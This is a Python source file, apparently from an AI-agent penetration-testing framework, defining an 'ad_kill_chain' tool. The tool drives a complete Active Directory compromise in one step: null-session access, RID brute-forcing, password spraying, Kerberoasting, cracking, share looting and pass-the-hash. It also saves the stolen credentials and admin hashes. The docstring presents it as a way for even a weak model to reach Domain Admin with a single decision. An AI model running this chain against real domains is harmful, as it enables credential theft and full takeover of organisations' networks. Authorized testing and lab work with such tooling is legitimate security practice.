# Author: Ali Alaqoul <alialaqoul@gmail.com>
"""Macro-action tool: run the full AD kill chain deterministically.

One tool call drives the whole no-credential -> Domain Admin path (guest -> RID
brute -> spray -> Kerberoast -> crack -> loot -> pass-the-hash -> read the goal),
branching on real output. This lets even a weak model reach domain compromise
with a single decision, and records findings/creds/flags along the way.
"""
from __future__ import annotations

from typing import Any

from .base import Tool, ToolContext, ToolResult


class AdChainTool(Tool):
    category = "ad-smb"
    name = "ad_kill_chain"
    active = True
    description = (
        "Run the full Active Directory attack chain against a domain controller "
        "in one step: guest/null session -> RID-brute users -> spray "
        "username==password -> Kerberoast -> crack -> loot readable shares -> "
        "pass-the-hash -> read the goal. Branches on real results; returns "
        "credentials, admin access, findings and any captured flags. Use this on "
        "a host that looks like an AD domain controller (ports 88/389/445)."
    )
    parameters = {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "Domain controller IP/host."},
            "domain": {"type": "string", "description": "AD domain (e.g. corp.local). "
                       "Optional — inferred from prior enumeration if known."},
            "max_rid": {"type": "string", "description": "Highest RID to enumerate. Default 4000."},
        },
        "required": ["target"],
    }

    def run(self, ctx: ToolContext, **kwargs: Any) -> ToolResult:
        target = kwargs["target"]
        self._authorize(ctx, target)

        from ..chains import run_ad_chain
        from ..tools.registry import default_registry
        from .. import store

        domain = kwargs.get("domain") or store.facts().get("domain") or ""
        reg = default_registry()

        def runner(tool_name: str, **kw):
            tool = reg.get(tool_name)
            if tool is None:
                return None
            try:
                return tool.run(ctx, **kw)
            except Exception:
                return None

        try:
            max_rid = int(str(kwargs.get("max_rid", "4000")))
        except ValueError:
            max_rid = 4000

        log_dir = "logs"
        try:
            from ..config import Config
            log_dir = Config.load().log_dir
        except Exception:
            pass

        state = run_ad_chain(target, domain, runner, report=None,
                             workdir=f"{log_dir}/chain", max_rid=max_rid)

        # Persist discovered credentials + flags into the shared store/facts.
        creds = state.get("creds", [])
        if creds:
            u, p = creds[0]
            store.set_fact("username", u)
            store.set_fact("password", p)
        for i, (acct, nt) in enumerate(state.get("admin", [])):
            store.set_fact("admin_account", acct)
            store.set_fact("admin_hash", nt)

        # Build a compact, grounded summary of what actually happened.
        users = state.get("users", [])
        lines = [f"AD kill chain against {target}"
                 + (f" ({domain})" if domain else "")]
        lines += [f"  - {s}" for s in state.get("steps", [])]
        if users:
            lines.append(f"Users ({len(users)}): " + ", ".join(users))
        if creds:
            lines.append("Credentials: " + ", ".join(f"{u}:{p}" for u, p in creds))
        if state.get("admin"):
            lines.append("ADMIN: " + ", ".join(a for a, _ in state["admin"]))
        if state.get("flags"):
            lines.append("FLAGS/SECRETS: " + ", ".join(state["flags"]))
        summary = (f"AD chain: {len(creds)} cred(s), "
                   f"{len(state.get('admin', []))} admin, "
                   f"{len(state.get('flags', []))} flag(s)")

        return ToolResult(
            ok=bool(creds or state.get("admin") or state.get("flags")),
            summary=summary,
            data={"target": target, "domain": domain,
                  "creds": creds, "users": users, "admin": state.get("admin", []),
                  "flags": state.get("flags", []),
                  "chain_findings": state.get("findings", []),
                  "command": f"ad_kill_chain {target}"},
            raw_output="\n".join(lines),
        )
